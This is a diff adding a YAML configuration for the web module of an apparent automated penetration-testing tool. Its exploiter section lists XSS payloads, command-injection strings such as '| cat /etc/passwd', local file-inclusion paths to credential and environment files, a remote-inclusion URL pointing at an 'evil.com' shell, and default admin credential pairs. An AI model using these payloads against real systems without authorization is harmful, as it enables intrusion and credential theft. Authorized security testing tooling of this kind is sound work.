@@ -1,0 +1,112 @@
+# Web Module Configuration
+
+# Diagnostic settings
+diagnostic:
+  tools:
+    - curl
+    - whatweb
+    - nmap
+    - wappalyzer
+  identify_technologies: true
+  enumerate_endpoints: true
+  check_common_files: true
+  test_default_credentials: true
+  max_endpoints: 100
+  timeout: 60
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+  common_paths:
+    - "/robots.txt"
+    - "/sitemap.xml"
+    - "/.git/"
+    - "/admin/"
+    - "/login/"
+    - "/backup/"
+    - "/.env"
+    - "/phpinfo.php"
+
+# Analyzer settings
+analyzer:
+  static_analysis:
+    enabled: true
+    check_source_code: true
+    check_javascript: true
+    check_comments: true
+    check_hidden_fields: true
+    
+  dynamic_analysis:
+    enabled: true
+    use_crawler: true
+    max_depth: 3
+    max_pages: 50
+    follow_redirects: true
+    handle_javascript: true
+    
+  vulnerability_detection:
+    sql_injection: true
+    xss: true
+    csrf: true
+    file_inclusion: true
+    command_injection: true
+    insecure_deserialization: true
+    ssrf: true
+    open_redirect: true
+    
+  authentication:
+    check_weak_passwords: true
+    check_session_management: true
+    check_jwt: true
+    check_oauth: true
+    common_credentials:
+      - ["admin", "admin"]
+      - ["admin", "password"]
+      - ["root", "toor"]
+      - ["guest", "guest"]
+
+# Exploiter settings
+exploiter:
+  techniques:
+    - sql_injection
+    - xss
+    - csrf
+    - file_inclusion
+    - command_injection
+    
+  sql_injection:
+    use_sqlmap: true
+    manual_payloads: true
+    blind_techniques: true
+    time_based: true
+    error_based: true
+    union_based: true
+    
+  xss:
+    reflected: true
+    stored: true
+    dom: true
+    payloads:
+      - "<script>alert(1)</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "javascript:alert(1)"
+    
+  csrf:
+    generate_poc: true
+    
+  file_inclusion:
+    lfi_paths:
+      - "/etc/passwd"
+      - "/proc/self/environ"
+      - "/var/log/apache2/access.log"
+    rfi_urls:
+      - "http://evil.com/shell.php"
+    
+  command_injection:
+    payloads:
+      - "; id"
+      - "| cat /etc/passwd"
+      - "`id`"
+      - "$(id)"
+    
+  execution:
+    timeout: 60
+    retry_count: 3
+    capture_output: true
